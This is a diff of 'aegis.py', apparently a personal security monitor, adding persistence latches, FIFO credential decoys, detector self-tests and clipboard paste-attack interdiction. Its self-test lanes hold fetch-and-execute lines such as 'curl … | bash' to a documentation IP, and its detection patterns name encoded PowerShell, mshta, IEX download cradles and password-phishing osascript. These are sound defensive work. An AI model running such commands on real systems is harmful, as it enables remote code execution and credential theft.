+def _latch_release(path, mode_str):
+    if IS_MAC:
+        _o, err, rc = run(["chflags", "nouchg", path], timeout=20)
+        return rc == 0, (err or "").strip()
+    if IS_WIN:
+        user = os.environ.get("USERNAME") or ""
+        _o, err, rc = run(["icacls", path, "/remove:d", user], timeout=30)
+        return rc == 0, (err or "").strip()
+    try:
+        original = int((mode_str or "mode:700").split(":", 1)[1], 8)
+        os.chmod(path, original)
+        return True, ""
+    except Exception as e:
+        return False, str(e)
+
+
+def _latch_intact(path, mode_str):
+    """Is the latch still in force? Never guesses: an unreadable path is
+    reported as unknown (None), not as intact."""
+    try:
+        if IS_MAC:
+            flags = getattr(os.stat(path), "st_flags", 0)
+            return bool(flags & getattr(stat_mod, "UF_IMMUTABLE", 0x2))
+        if IS_WIN:
+            out, _e, rc = run(["icacls", path], timeout=30)
+            if rc != 0:
+                return None
+            user = (os.environ.get("USERNAME") or "").lower()
+            for line in (out or "").splitlines():
+                low = line.lower()
+                if user and user in low and "(deny)" in low:
+                    return True
+            return False
+        want = 0o500 if os.path.isdir(path) else 0o400
+        return stat.S_IMODE(os.stat(path).st_mode) == want
+    except Exception:
+        return None
+
+
+def cmd_latch(action="on"):
+    """Pre-claim the persistence surfaces so a dropper's write fails."""
+    ensure_state()
+    state = load_json(LATCH_FILE, {})
+    if not isinstance(state, dict):
+        state = {}
+    if action in ("off", "remove"):
+        if not state:
+            print("No latches are set.")
+            return 0
+        rc = 0
+        for path, rec in list(state.items()):
+            ok, err = _latch_release(path, rec.get("mode"))
+            if ok:
+                del state[path]
+                print("  released %s" % path)
+            else:
+                rc = 1
+                print("  FAILED to release %s (%s)" % (path, err))
+        save_json(LATCH_FILE, state)
+        log_action("latch", "all", "released")
+        return rc
+    if action == "status":
+        if not state:
+            print("No latches are set. `aegis.py latch on` to pre-claim the "
+                  "persistence surfaces.")
+            return 0
+        print("# Latches (%d)\n" % len(state))
+        for path, rec in sorted(state.items()):
+            intact = _latch_intact(path, rec.get("mode"))
+            mark = {True: "held", False: "CLEARED", None: "unknown"}[intact]
+            print("  [%-7s] %s" % (mark, path))
+        return 0
+
+    targets = _latch_targets()
+    if not targets:
+        print("No latchable persistence surfaces found on this machine.")
+        return 1
+    if IS_LINUX:
+        print("NOTE: Linux has no unprivileged immutable flag (chattr +i needs "
+              "CAP_LINUX_IMMUTABLE). These are mode changes — a speed bump that "
+              "a determined same-uid attacker simply chmods back. The VALUE "
+              "here is the tamper signal, not the block.\n")
+    applied = 0
+    for path in targets:
+        if path in state:
+            continue
+        mode_str, err = _latch_apply(path)
+        if mode_str is None:
+            print("  could not latch %s (%s)" % (path, err))
+            continue
+        state[path] = {"mode": mode_str, "ts": _epoch()}
+        applied += 1
+        print("  latched %s" % path)
+    save_json(LATCH_FILE, state)
+    log_action("latch", "%d surfaces" % applied, "applied")
+    print("\n%d surface(s) latched. A legitimate installer will now FAIL to "
+          "write here — open a window first:\n  aegis.py unlatch <path>"
+          % applied)
+    return 0
+
+
+def cmd_unlatch(path=None):
+    """Open a latched surface — deliberately hostile to automation.
+
+    The flagship signal ('a latch was cleared with no unlatch record') is worth
+    nothing if malware can just shell out to `aegis.py unlatch`. So this refuses
+    a non-interactive caller outright and requires a CSPRNG code to be typed
+    back. A background script has no tty and cannot read the code off our stdout,
+    so it cannot satisfy this without a human at the keyboard."""
+    ensure_state()
+    state = load_json(LATCH_FILE, {})
+    if not isinstance(state, dict) or not state:
+        print("No latches are set.")
+        return 1
+    if not path:
+        print("usage: aegis.py unlatch <path>   (see `aegis.py latch status`)")
+        return 1
+    rp = os.path.realpath(path)
+    match = path if path in state else (rp if rp in state else None)
+    if match is None:
+        print("not latched: %s" % path)
+        return 1
+    if not (sys.stdin.isatty() and sys.stdout.isatty()):
+        print("refuse: unlatch requires an interactive terminal. This is the "
+              "point — if a script could call it, malware could call it, and "
+              "the 'latch cleared without authorization' signal would be worth "
+              "nothing.")
+        log_action("unlatch", match, "refused-not-interactive")
+        return 1
+    import secrets
+    code = "%06d" % secrets.randbelow(1000000)
+    print("Type this code to confirm unlatching\n    %s\n    %s" % (match, code))
+    try:
+        typed = input("code: ").strip()
+    except (EOFError, KeyboardInterrupt):
+        print("\naborted.")
+        return 1
+    if not hmac.compare_digest(typed, code):
+        print("code did not match; nothing was changed.")
+        log_action("unlatch", match, "refused-bad-code")
+        return 1
+    ok, err = _latch_release(match, state[match].get("mode"))
+    if not ok:
+        print("could not release %s (%s)" % (match, err))
+        log_action("unlatch", match, "failed")
+        return 1
+    del state[match]
+    save_json(LATCH_FILE, state)
+    log_action("unlatch", match, "ok-authorized")
+    print("Unlatched %s. Re-latch when you are done:\n  aegis.py latch on"
+          % match)
+    return 0
+
+
+def check_latches():
+    """Sensor: a latch cleared out-of-band. Silent unless latches are in use, so
+    a machine that never ran `latch on` sees byte-identical scan behaviour."""
+    state = load_json(LATCH_FILE, {})
+    if not isinstance(state, dict) or not state:
+        return []
+    findings = []
+    for path, rec in sorted(state.items()):
+        intact = _latch_intact(path, rec.get("mode"))
+        if intact is True:
+            continue
+        if intact is None:
+            findings.append(finding(
+                "INFO", "latch", "Latched surface could not be checked",
+                "%s: the latch state could not be read this scan; coverage for "
+                "this surface is unknown, not clean." % path,
+                "latch:unknown:%s" % path, path=path, confidence="low"))
+            continue
+        findings.append(finding(
+            "HIGH", "latch", "Persistence latch was cleared",
+            "%s was pre-claimed by Aegis and is now writable again, with no "
+            "authorized `unlatch` recorded. Nothing benign clears this flag — "
+            "check actions.jsonl and this surface's contents now." % path,
+            "latch:cleared:%s" % path, path=path))
+    return findings
+
+
+# --- FIFO decoys: the credential paths a stealer hardcodes ------------------ #
+#
+# A honeytoken whose only consumer is an adversary is the one detection class an
+# unprivileged process can make near-perfectly precise. Making it a FIFO rather
+# than a file upgrades it from evidence to interdiction: POSIX guarantees a
+# read-side FIFO open BLOCKS until a writer arrives, so a stealer's read of the
+# decoy hangs, and a non-blocking write-side open returns ENXIO when nobody is
+# reading — which makes "is someone reading my honeytoken RIGHT NOW" a single
+# cheap non-blocking syscall.
+#
+# Bypass, stated rather than hidden: a reader using O_NONBLOCK does not block,
+# so the atime check below is the second, weaker net for exactly that case.
+# Windows has no FIFO analogue; the surface is absent there, not degraded.
+
+_DECOY_RELPATHS = (
+    os.path.join(".aws", "credentials.bak"),
+    os.path.join(".ssh", "id_rsa.bak"),
+    ".npmrc.old",
+)
+
+
+def _decoy_paths():
+    return [os.path.join(HOME, rel) for rel in _DECOY_RELPATHS]
+
+
+def cmd_decoy(action="plant"):
+    """Plant (or remove) FIFO decoys at credential-shaped paths."""
+    ensure_state()
+    if not hasattr(os, "mkfifo"):
+        print("Decoys are a POSIX FIFO mechanism; this platform has no "
+              "equivalent, so the surface is absent here (not degraded).")
+        return 2
+    state = load_json(DECOY_FILE, {})
+    if not isinstance(state, dict):
+        state = {}
+    if action in ("remove", "off"):
+        for path in list(state):
+            try:
+                if stat.S_ISFIFO(os.stat(path).st_mode):
+                    os.unlink(path)
+                    print("  removed %s" % path)
+            except Exception as e:
+                print("  could not remove %s (%s)" % (path, e))
+            state.pop(path, None)
+        save_json(DECOY_FILE, state)
+        log_action("decoy", "all", "removed")
+        return 0
+
+    planted = 0
+    for path in _decoy_paths():
+        if os.path.lexists(path):
+            # NEVER replace something real. A decoy that ate a user's actual
+            # credential file would be a catastrophic own-goal.
+            print("  skipped %s (already exists — refusing to replace it)"
+                  % path)
+            continue
+        try:
+            os.makedirs(os.path.dirname(path), mode=0o700, exist_ok=True)
+            os.mkfifo(path, 0o600)
+        except Exception as e:
+            print("  could not plant %s (%s)" % (path, e))
+            continue
+        try:
+            atime = os.stat(path).st_atime
+        except Exception:
+            atime = 0
+        state[path] = {"ts": _epoch(), "atime": atime}
+        planted += 1
+        print("  planted %s" % path)
+    save_json(DECOY_FILE, state)
+    log_action("decoy", "%d paths" % planted, "planted")
+    print("\n%d decoy(s) planted. Any read of these is an attacker by "
+          "construction — nothing legitimate knows they exist." % planted)
+    return 0
+
+
+def _decoy_reader(path):
+    """Which pid is blocked on this FIFO, if we can tell."""
+    if IS_LINUX:
+        try:
+            target = os.path.realpath(path)
+            for pid in (d for d in os.listdir("/proc") if d.isdigit()):
+                fddir = "/proc/%s/fd" % pid
+                try:
+                    for fd in os.listdir(fddir):
+                        if os.path.realpath(os.path.join(fddir, fd)) == target:
+                            return pid
+                except Exception:
+                    continue
+        except Exception:
+            return None
+        return None
+    out, _e, rc = run(["lsof", "-t", "--", path], timeout=20)
+    if rc == 0 and (out or "").strip():
+        return (out or "").strip().splitlines()[0].strip()
+    return None
+
+
+def check_decoys():
+    """Sensor: someone is reading a credential decoy. Silent unless planted."""
+    state = load_json(DECOY_FILE, {})
+    if not isinstance(state, dict) or not state or not hasattr(os, "mkfifo"):
+        return []
+    findings = []
+    for path, rec in sorted(state.items()):
+        try:
+            st = os.stat(path)
+        except Exception:
+            findings.append(finding(
+                "MEDIUM", "decoy", "Credential decoy disappeared",
+                "%s was planted as a honeytoken and is now gone. Nothing "
+                "legitimate touches it." % path,
+                "decoy:missing:%s" % path, path=path))
+            continue
+        if not stat.S_ISFIFO(st.st_mode):
+            findings.append(finding(
+                "HIGH", "decoy", "Credential decoy was replaced",
+                "%s was a FIFO honeytoken and is now a regular file — "
+                "something rewrote it." % path,
+                "decoy:replaced:%s" % path, path=path))
+            continue
+        # The live check: a writer-side non-blocking open succeeds only when a
+        # reader is already blocked on the other end.
+        blocked = False
+        try:
+            fd = os.open(path, os.O_WRONLY | os.O_NONBLOCK)
+            os.close(fd)
+            blocked = True
+        except OSError as e:
+            if e.errno not in (errno.ENXIO, errno.ENOENT):
+                blocked = False
+        except Exception:
+            blocked = False
+        if blocked:
+            pid = _decoy_reader(path)
+            _owner, comm = _process_identity(pid) if pid else (None, None)
+            findings.append(finding(
+                "CRITICAL", "decoy", "A process is reading a credential decoy",
+                "%s is being read RIGHT NOW by pid %s (%s). This path is a "
+                "honeytoken Aegis planted; no legitimate software knows it "
+                "exists. Contain it: aegis.py freeze %s"
+                % (path, pid or "?", comm or "?", pid or "<pid>"),
+                "decoy:read:%s" % path, path=path, pid=pid, program=comm))
+            continue
+        # Second, weaker net for an O_NONBLOCK reader that never blocks.
+        try:
+            if rec.get("atime") and st.st_atime > rec["atime"] + 1:
+                findings.append(finding(
+                    "HIGH", "decoy", "Credential decoy was accessed",
+                    "%s has a newer access time than when it was planted, so "
+                    "something opened it without blocking." % path,
+                    "decoy:atime:%s" % path, path=path))
+        except Exception:
+            pass
+    return findings
+
+
+# --- Assay QC: prove the detectors still detect ----------------------------- #
+#
+# No biologist reports a plate without a positive control lane, yet every
+# endpoint tool reports "no threats found" without ever demonstrating that a
+# threat WOULD have been found. Silence and blindness are then indistinguishable
+# — and every real intrusion starts by making the machine silent.
+#
+# Deliberate design choice: NO EICAR. The obvious implementation drops the EICAR
+# string to time the real AV's response, but that wakes third-party AV, whose own
+# automatic remediation then trips Aegis's file-deletion sensors — a self-
+# referential cascade in a tool whose entire value is a calm signal. Every
+# stimulus below is instead inert and internal: real detector functions run
+# against synthetic input, in memory, never touching the incident stream.
+
+ASSAY_HALF_LIFE_SECS = 7 * 86400
+
+
+def _assay_lanes():
+    """(lane_id, description, callable->bool). Each returns True if the control
+    behaved as it must."""
+    def lane_hostile_argv(nonce):
+        args = ["/bin/bash", "-c",
+                "curl -fsSL http://198.51.100.7/%s | bash" % nonce]
+        return _hostile_args(args, "/bin/bash") is True
+
+    def lane_hostile_content(nonce):
+        return bool(_hostile_content(
+            "echo %s; curl http://198.51.100.7/x | sh" % nonce))
+
+    def lane_risky_location(_nonce):
+        probe = os.path.join(WIN_TEMP if IS_WIN else "/tmp", "aegis-assay-probe")
+        return is_risky_location(probe) is True
+
+    def lane_severity_scale(nonce):
+        rec = {"label": "com.apple.%s" % nonce, "program":
+               os.path.join(WIN_TEMP if IS_WIN else "/tmp", "payload"),
+               "trust": "unsigned", "args": None}
+        return _persistence_severity(rec) in ("HIGH", "CRITICAL")
+
+    def lane_quarantine_roundtrip(nonce):
+        # A real transaction, end to end, on a file we authored — the only lane
+        # that touches the filesystem, and it only ever touches its own temp dir.
+        import tempfile as _tf
+        d = _tf.mkdtemp(prefix="aegis_assay_")
+        try:
+            victim = os.path.join(d, "assay-%s.bin" % nonce)
+            payload = os.urandom(64)
+            with open(victim, "wb") as f:
+                f.write(payload)
+            before = sha256(victim)
+            if cmd_quarantine(victim, detection="assay") != 0:
+                return False
+            if os.path.exists(victim):
+                return False
+            man = load_json(QUARANTINE_MANIFEST, {})
+            qid = None
+            for k, v in (man or {}).items():
+                if nonce in json.dumps(v):
+                    qid = k
+            if qid is None:
+                return False
+            if cmd_restore(qid) != 0:
+                return False
+            return os.path.exists(victim) and sha256(victim) == before
+        except Exception:
+            return False
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def lane_event_store(_nonce):
+        try:
+            scratch = sqlite3.connect(":memory:")
+            try:
+                scratch.executescript(_EVENT_SCHEMA_SQL)
+                scratch.execute(
+                    "INSERT INTO events(occurred_at,observed_at,source,"
+                    "event_type,data_json) VALUES(?,?,?,?,?)",
+                    (_epoch(), _epoch(), "assay", "observation.finding", "{}"))
+                return scratch.execute("SELECT COUNT(*) FROM events"
+                                       ).fetchone()[0] == 1
+            finally:
+                scratch.close()
+        except Exception:
+            return False
+
+    return [
+        ("hostile-argv", "fetch-and-execute argv still scores hostile",
+         lane_hostile_argv),
+        ("hostile-content", "shell-content grammar still matches",
+         lane_hostile_content),
+        ("risky-location", "volatile exec dirs still rate as risky",
+         lane_risky_location),
+        ("severity-scale", "vendor-label impersonation still rates HIGH+",
+         lane_severity_scale),
+        ("quarantine-roundtrip", "quarantine->restore is byte-exact",
+         lane_quarantine_roundtrip),
+        ("event-store", "the SQLite event store accepts and reads back",
+         lane_event_store),
+    ]
+
+
+def cmd_assay():
+    """Run the positive-control lanes and record what is currently PROVEN."""
+    ensure_state()
+    import secrets
+    state = load_json(ASSAY_FILE, {})
+    if not isinstance(state, dict):
+        state = {}
+    now = _epoch()
+    print("# Aegis assay — positive controls\n")
+    failed = 0
+    for lane_id, desc, fn in _assay_lanes():
+        # CSPRNG, and never persisted: a guessable or readable nonce would let
+        # an attacker dress real activity up as a self-test.
+        nonce = secrets.token_hex(8)
+        t0 = time.time()
+        try:
+            ok = bool(fn(nonce))
+        except Exception as e:
+            ok = False
+            log_run("assay lane %s raised: %s" % (lane_id, e))
+        dur = int((time.time() - t0) * 1000)
+        prev = state.get(lane_id, {})
+        # EWMA over latency: drift (a control that still passes but takes 8s
+        # where it took 400ms) is degradation visible BEFORE an outright failure.
+        ewma = dur if not prev.get("ewma_ms") else \
+            int(0.7 * prev["ewma_ms"] + 0.3 * dur)
+        state[lane_id] = {"last_run": now, "last_ok": now if ok else
+                          prev.get("last_ok"), "ok": ok, "ms": dur,
+                          "ewma_ms": ewma}
+        drift = ""
+        if prev.get("ewma_ms") and dur > max(250, prev["ewma_ms"] * 4):
+            drift = "  (SLOW: %dms vs %dms baseline)" % (dur, prev["ewma_ms"])
+        print("  [%s] %-22s %s%s" % ("PASS" if ok else "FAIL", lane_id, desc,
+                                     drift))
+        if not ok:
+            failed += 1
+    save_json(ASSAY_FILE, state)
+    print("\n%d/%d controls proven this run." %
+          (len(state) - failed, len(state)))
+    if failed:
+        print("A FAILING control means Aegis cannot currently demonstrate that "
+              "detector works. Treat it as lost coverage, not as a clean scan.")
+    return 1 if failed else 0
+
+
+def check_assay():
+    """Sensor: a control whose last proof is older than its half-life. Silent
+    until `aegis.py assay` has been run at least once."""
+    state = load_json(ASSAY_FILE, {})
+    if not isinstance(state, dict) or not state:
+        return []
+    now, stale, broken = _epoch(), [], []
+    for lane_id, rec in sorted(state.items()):
+        if not rec.get("ok"):
+            broken.append(lane_id)
+        elif now - rec.get("last_ok", 0) > ASSAY_HALF_LIFE_SECS:
+            stale.append(lane_id)
+    findings = []
+    if broken:
+        findings.append(finding(
+            "HIGH", "assay", "A positive control is failing",
+            "These detectors did not fire against their own known-good "
+            "stimulus, so their coverage is not real right now: %s"
+            % ", ".join(broken), "assay:failing:%s" % ",".join(sorted(broken))))
+    if stale:
+        findings.append(finding(
+            "INFO", "assay", "Detector coverage is unproven",
+            "These controls have not been re-proven within %d days, so their "
+            "coverage is asserted rather than demonstrated: %s. Run "
+            "`aegis.py assay`." % (ASSAY_HALF_LIFE_SECS // 86400,
+                                   ", ".join(stale)),
+            "assay:stale:%s" % ",".join(sorted(stale)), confidence="low"))
+    return findings
+
+
+# --- Clipboard interdiction: reach the ClickFix payload before the hands ---- #
+#
+# ClickFix is the dominant initial-access vector of this threat era, and it has
+# exactly one moment where the attack is inert DATA the user owns rather than
+# code running as the user: between the page's clipboard write and the human's
+# paste. Every existing sensor here (shell history, argv) fires strictly after
+# execution — forensics, not defence.
+#
+# Two tiers, because the grammar cannot be honest as one. `curl … | sh` is the
+# documented install path for rustup and much else; treating it as certainly
+# hostile would make this the highest-false-positive surface in the tool for
+# exactly the audience that runs it. So: CERTAIN patterns (no legitimate use
+# worth protecting) may be substituted; SUSPECT patterns only ever warn.
+
+_CLIP_CERTAIN = (
+    (re.compile(r"osascript\b.{0,200}?display\s+dialog.{0,200}?hidden\s+answer",
+                re.I | re.S), "osascript-password-phish"),
+    (re.compile(r"\bmshta\b\s+(?:https?:|javascript:)", re.I),
+     "mshta-remote-exec"),
+    (re.compile(r"powershell(?:\.exe)?\b[^|;]{0,200}?\s-(?:enc|encodedcommand)\b",
+                re.I), "powershell-encoded-command"),
+    (re.compile(r"powershell(?:\.exe)?\b[^|;]{0,200}?\s-w(?:indowstyle)?\s+hidden",
+                re.I), "powershell-hidden-window"),
+    (re.compile(r"\bapplescript://", re.I), "applescript-url-scheme"),
+    (re.compile(r"\bIEX\s*\(\s*(?:New-Object\s+Net\.WebClient|iwr|irm)\b", re.I),
+     "iex-download-cradle"),
+)
+
+_CLIP_SUSPECT = (
+    (re.compile(r"\bcurl\b[^|]{0,300}\|\s*(?:sudo\s+)?(?:ba|z|d)?sh\b", re.I),
+     "curl-pipe-shell"),
+    (re.compile(r"\bwget\b[^|]{0,300}\|\s*(?:sudo\s+)?(?:ba|z|d)?sh\b", re.I),
+     "wget-pipe-shell"),
+    (re.compile(r"\bbase64\b\s+(?:--decode|-d|-D)\b[^|]{0,200}\|", re.I),
+     "base64-decode-pipe"),
+    (re.compile(r"\bdscl\s+\.\s+-authonly\b", re.I), "dscl-password-check"),
+    (re.compile(r"\bxattr\b\s+-[cd]r?\b", re.I), "quarantine-strip"),
+)
+
+
+def clipboard_grammar(text):
+    """(tier, hits) for a clipboard blob. tier is 'certain', 'suspect' or None.
+
+    The structural tells matter as much as the commands: a TRAILING CARRIAGE
+    RETURN is the literal auto-execute mechanism of a paste attack (the shell
+    runs the line before the human can read it), and a long whitespace run
+    scrolls the payload off the visible line. Neither has an innocent reading in
+    a copied command, so either one promotes a suspect hit to certain."""
+    if not text or not text.strip():
+        return None, []
+    hits = [name for rx, name in _CLIP_CERTAIN if rx.search(text)]
+    if hits:
+        return "certain", sorted(set(hits))
+    suspect = [name for rx, name in _CLIP_SUSPECT if rx.search(text)]
+    if not suspect:
+        return None, []
+    structural = []
+    if text.rstrip(" \t").endswith(("\r", "\n")) and text.strip():
+        structural.append("auto-execute-newline")
+    if re.search(r"\S[ \t]{40,}\S", text):
+        structural.append("offscreen-padding")
+    if structural:
+        return "certain", sorted(set(suspect + structural))
+    return "suspect", sorted(set(suspect))
+
+
+def _clipboard_read():
+    """Current clipboard text, or None if this platform has no unprivileged
+    reader available (absent, not degraded)."""
+    if IS_MAC:
+        out, _e, rc = run(["pbpaste"], timeout=15)
+        return out if rc == 0 else None
+    if IS_WIN:
+        out, _e, rc = run(["powershell", "-NoProfile", "-NonInteractive",
+                           "-Command", "Get-Clipboard -Raw"], timeout=30)
+        return out if rc == 0 else None
+    for tool, args in (("wl-paste", ["wl-paste", "--no-newline"]),
+                       ("xclip", ["xclip", "-selection", "clipboard", "-o"])):
+        if shutil.which(tool):
+            out, _e, rc = run(args, timeout=15)
+            if rc == 0:
+                return out
+    return None
+
+
+def _clipboard_write(text):
+    if IS_MAC:
+        try:
+            p = subprocess.run(["/usr/bin/pbcopy"], input=text, text=True,
+                               timeout=15, check=False)
+            return p.returncode == 0
+        except Exception:
+            return False
+    if IS_WIN:
+        # $env:AEGIS_CLIP, NOT $input: extra_env is this codebase's
+        # injection-safe channel for handing a string to PowerShell (the value
+        # never touches the command line, so no quoting or escaping can be
+        # turned against us), and $input is the *pipeline* variable — with
+        # nothing piped in it is empty, so the substitution would silently
+        # clear the clipboard instead of replacing it.
+        _o, _e, rc = run(["powershell", "-NoProfile", "-NonInteractive",
+                          "-Command", "Set-Clipboard -Value $env:AEGIS_CLIP"],
+                         timeout=30, extra_env={"AEGIS_CLIP": text})
+        return rc == 0
+    for tool, args in (("wl-copy", ["wl-copy"]),
+                       ("xclip", ["xclip", "-selection", "clipboard"])):
+        if shutil.which(tool):
+            try:
+                p = subprocess.run(args, input=text, text=True, timeout=15,
+                                   check=False)
+                return p.returncode == 0
+            except Exception:
+                continue
+    return False
+
+
+_CLIP_INERT = ("# Aegis blocked a clipboard command that matched a known "
+               "attack pattern.\n# Restore the original with: aegis.py "
+               "clipboard restore %s")
+
+
+def cmd_clipboard(action="check"):
+    """Inspect (or guard) the clipboard for pasted-command attack shapes."""
+    ensure_state()
+    if action == "restore":
+        rec = load_json(CLIPBOARD_FILE, {})
+        original = (rec or {}).get("original")
+        if not original:
+            print("nothing to restore.")
+            return 1
+        if not _clipboard_write(original):
+            print("could not write the clipboard back.")
+            return 1
+        save_json(CLIPBOARD_FILE, {})
+        log_action("clipboard", "restore", "ok")
+        print("Clipboard restored.")
+        return 0
+
+    text = _clipboard_read()
+    if text is None:
+        print("No unprivileged clipboard reader on this platform "
+              "(absent, not degraded).")
+        return 2
+    tier, hits = clipboard_grammar(text)
+    if not tier:
+        # Deliberately NOT logged, hashed or persisted in any form. Password
+        # managers put secrets here; a security tool that quietly journals every
+        # clipboard it sees has become the thing it defends against.
+        print("Clipboard does not match any attack pattern.")
+        return 0
+
+    preview = re.sub(r"\s+", " ", text.strip())[:120]
+    print("%s clipboard content — matched: %s\n  %s"
+          % ("HOSTILE" if tier == "certain" else "SUSPECT",
+             ", ".join(hits), preview))
+    if action != "guard":
+        print("\nRun `aegis.py clipboard guard` to neutralize it before paste.")
+        return 2 if tier == "certain" else 0
+
+    if tier == "suspect":
+        # Never silently rewrite something with a legitimate reading. rustup's
+        # own documented installer is this exact shape.
+        print("\nNot substituting: this pattern has legitimate uses (this is "
+              "how rustup and similar installers are documented). Substituting "
+              "it silently would break real work.\nIf you did not copy this "
+              "deliberately, clear your clipboard by hand.")
+        return 0
+
+    save_json(CLIPBOARD_FILE, {"original": text, "ts": _epoch(), "hits": hits})
+    if not _clipboard_write(_CLIP_INERT % "now"):
+        print("could not rewrite the clipboard; the original is unchanged.")
+        return 1
+    log_action("clipboard", ",".join(hits), "substituted")
+    print("\nClipboard replaced with an inert comment. The original is held "
+          "for you:\n  aegis.py clipboard restore")
+    return 0
+
+
+# --- Hindsight: replay detectors over raw history (developer tooling) ------- #
+#
+# Aegis already replays CORRELATION over stored findings. This replays the
+# DETECTORS themselves over stored raw sensor input, which is a different and
+# strictly harder question: `replay` asks "what would today's chain rules make
+# of yesterday's findings", `rehunt` asks "what would today's detectors have
+# found in yesterday's raw state, that yesterday's detectors missed".
+#
+# Scoped as developer tooling, honestly. A quiet machine accumulates ~0-3 real
+# incidents in six months, which is far too few to compute a meaningful
+# precision estimate — so the promotion gate below REFUSES loudly below a sample
+# floor rather than quietly reporting a number built on n=2.
+
+OBSERVATION_KEEP_DAYS = 45
+BACKTEST_MIN_SAMPLES = 20
+
+
+def record_observation(sensor_id, payload):
+    """Persist one raw sensor snapshot, gzipped. Best-effort by design: losing a
+    snapshot must never fail a scan."""
+    try:
+        import gzip
+        os.makedirs(OBSERVATIONS_DIR, mode=0o700, exist_ok=True)
+        path = os.path.join(OBSERVATIONS_DIR,
+                            "%s.%d.json.gz" % (sensor_id, _epoch()))
+        blob = json.dumps(payload, sort_keys=True, default=str).encode("utf-8")
+        with gzip.open(path, "wb") as f:
+            f.write(blob)
+        os.chmod(path, 0o600)
+        _prune_observations()
+        return path
+    except Exception as e:
+        log_run("observation store failed for %s: %s" % (sensor_id, e))
+        return None
+
+
+def _prune_observations():
+    cutoff = _epoch() - OBSERVATION_KEEP_DAYS * 86400
+    try:
+        for name in os.listdir(OBSERVATIONS_DIR):
+            parts = name.split(".")
+            if len(parts) < 3 or not parts[-3].isdigit():
+                continue
+            if int(parts[-3]) < cutoff:
+                os.unlink(os.path.join(OBSERVATIONS_DIR, name))
+    except Exception:
+        pass
+
+
+def _load_observations(sensor_id, days):
+    import gzip
+    cutoff = _epoch() - int(days) * 86400
+    out = []
+    try:
+        names = sorted(os.listdir(OBSERVATIONS_DIR))
+    except Exception:
+        return out
+    for name in names:
+        if not name.startswith(sensor_id + "."):
+            continue
+        parts = name.split(".")
+        if len(parts) < 3 or not parts[-3].isdigit():
+            continue
+        ts = int(parts[-3])
+        if ts < cutoff:
+            continue
+        try:
+            with gzip.open(os.path.join(OBSERVATIONS_DIR, name), "rb") as f:
+                out.append((ts, json.loads(f.read().decode("utf-8"))))
+        except Exception:
+            continue
+    return out
+
+
+def cmd_rehunt(days=30):
+    """Re-run TODAY's detectors over stored raw snapshots.
+
+    Read-only: opens no incident, sends no notification, writes no state. The
+    number it exists to produce is silent-miss latency — how long a thing sat
+    there before the detectors could see it."""
+    ensure_state()
+    snaps = _load_observations("persistence.snapshot", days)
+    print("# Aegis rehunt — %d stored snapshot(s) over %s days\n"
+          % (len(snaps), days))
+    if len(snaps) < 2:
+        print("Not enough stored history to re-hunt. Raw snapshots accumulate "
+              "once this build has been scanning for a while "
+              "(kept %d days)." % OBSERVATION_KEEP_DAYS)
+        return 0
+    snaps.sort()
+    now, retro = _epoch(), []
+    for idx in range(1, len(snaps)):
+        prev_ts, prev = snaps[idx - 1]
+        cur_ts, cur = snaps[idx]
+        if not isinstance(prev, dict) or not isinstance(cur, dict):
+            continue
+        for f in check_persistence(prev, cur):
+            if SEV_ORDER[f["severity"]] >= SEV_ORDER["HIGH"]:
+                retro.append((cur_ts, f))
+    if not retro:
+        print("No HIGH+ finding surfaces when today's detectors are replayed "
+              "over that window. On a clean machine this is the expected "
+              "result, and it bounds the silent-miss rate rather than proving "
+              "there was nothing to find.")
+        return 0
+    print("Today's detectors find %d HIGH+ item(s) in stored history:\n"
+          % len(retro))
+    for ts, f in sorted(retro, key=lambda r: r[0]):
+        print("  %s  %-8s %s\n      %s\n      silent-miss latency: %.1f days"
+              % (_iso_short(ts), f["severity"], f["title"], f["detail"],
+                 (now - ts) / 86400.0))
+    return 0
+
+
+def _iso_short(epoch_val):
+    try:
+        return datetime.fromtimestamp(int(epoch_val)).strftime("%Y-%m-%d %H:%M")
+    except Exception:
+        return "?"
+
+
+def cmd_backtest(category=None):
+    """Score a detection category against this machine's own dismissal labels.
+
+    Refuses below a sample floor instead of reporting a precision figure built
+    on a handful of events — the same discipline as the rest of the tool:
+    unproven coverage is stated as unproven, never rounded up to a number."""
+    ensure_state()
+    init_event_store()
+    db = _event_connection()
+    try:
+        rows = db.execute(
+            "SELECT category, reason_code, COUNT(*) AS n FROM dismissals "
+            "GROUP BY category, reason_code").fetchall()
+        totals = db.execute(
+            "SELECT COUNT(*) AS n FROM events "
+            "WHERE event_type='observation.finding'").fetchone()
+    finally:
+        db.close()
+    labelled = {}
+    for r in rows:
+        cat = r["category"] or "(uncategorised)"
+        bucket = labelled.setdefault(cat, {"false-positive": 0,
+                                           "benign-positive": 0})
+        code = (r["reason_code"] or "").lower()
+        if "false" in code:
+            bucket["false-positive"] += r["n"]
+        else:
+            bucket["benign-positive"] += r["n"]
+    print("# Aegis backtest — %d recorded finding events, %d labelled "
+          "categor%s\n" % ((totals["n"] if totals else 0), len(labelled),
+                           "y" if len(labelled) == 1 else "ies"))
+    if not labelled:
+        print("No typed dismissals recorded yet, so there are no labels to "
+              "score against. Label findings with `aegis.py incident <id> "
+              "false-positive|benign-positive` and re-run.")
+        return 0
+    targets = [category] if category else sorted(labelled)
+    for cat in targets:
+        bucket = labelled.get(cat)
+        if not bucket:
+            print("  %s: no labels recorded" % cat)
+            continue
+        n = bucket["false-positive"] + bucket["benign-positive"]
+        if n < BACKTEST_MIN_SAMPLES:
+            print("  %-16s REFUSED — %d label(s), need %d. A precision figure "
+                  "from this few is noise, and a rule promoted on noise is "
+                  "worse than one never measured." % (cat, n,
+                                                      BACKTEST_MIN_SAMPLES))
+            continue
+        precision = 1.0 - (bucket["false-positive"] / float(n))
+        print("  %-16s precision %.2f over %d label(s) "
+              "(%d false-positive, %d benign-positive)"
+              % (cat, precision, n, bucket["false-positive"],
+                 bucket["benign-positive"]))
+    return 0
+
+
+# --------------------------------------------------------------------------- #
 # Background registration (launchd / systemd user timer / Task Scheduler).
 #
 # One command per platform, same contract everywhere: copy the script to a
@@ -9994,6 +11635,60 @@ HELP = """aegis.py - personal security monitor for macOS, Linux and Windows
                          kill, then quarantine. <target> is a launchd .plist
                          (macOS), a systemd unit / .desktop file (Linux), or
                          task:<NAME> / a startup-folder file (Windows)
+
+ PROTECT (opt-in; pre-commitment and REVERSIBLE containment, still by hand)
+  freeze <pid>     SUSPEND a process tree of yours (SIGSTOP / NtSuspendProcess).
+                   Reversible, so it needs no privilege and can be used on
+                   weaker evidence than any irreversible action: being wrong
+                   costs one `thaw`. Stops new reads/connections/forks; does
+                   NOT un-send bytes already in the kernel's socket buffers.
